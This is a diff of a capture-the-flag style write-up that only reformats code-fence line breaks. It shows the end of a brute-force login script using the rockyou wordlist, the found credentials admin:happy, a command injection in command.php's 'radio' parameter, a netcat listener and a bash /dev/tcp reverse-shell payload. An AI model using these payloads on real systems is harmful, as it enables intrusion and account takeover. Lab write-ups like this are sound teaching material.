@@ -117,13 +117,15 @@ with open("/usr/share/wordlists/rockyou.txt","r") as file:
         if len(res.text) != 206:
             print("[+] Found password : ",password)
             break
-```Running this script quickly found the correct password:
+```
+Running this script quickly found the correct password:
 ```bash
 python3 bruteforce_login.py
 # ... (output omitted for brevity)
 [*] 463 password tested. Current :  happy
 [+] Found password :  happy
-```The credentials `admin:happy` were successfully found.
+```
+The credentials `admin:happy` were successfully found.
 
 Upon logging in with `admin:happy`, the `command.php` page became accessible. This page presented a simple interface to run commands like "List Files", "Disk Usage", and "Disk Free". The Burp Suite screenshot clearly shows the `ls -l` command being executed via the `radio` parameter in a POST request to `command.php`. This confirms a command injection vulnerability.
 
@@ -133,7 +135,8 @@ Upon logging in with `admin:happy`, the `command.php` page became accessible. Th
 To gain a reverse shell, a `netcat` listener was set up on the attacking machine:
 ```bash
 nc -lvnp 4444
-```Then, a reverse shell payload was injected via the `command.php` interface. While the exact payload used to get the shell is not explicitly shown in the provided logs, a common method would be to use a `bash` reverse shell command, for example, by modifying the `radio` parameter to something like `radio=ls+-l;bash+-i+>&+/dev/tcp/192.168.1.X/4444+0>&1&submit=Run`.
+```
+Then, a reverse shell payload was injected via the `command.php` interface. While the exact payload used to get the shell is not explicitly shown in the provided logs, a common method would be to use a `bash` reverse shell command, for example, by modifying the `radio` parameter to something like `radio=ls+-l;bash+-i+>&+/dev/tcp/192.168.1.X/4444+0>&1&submit=Run`.
 
 A shell was successfully obtained as the `www-data` user.
 ```bash
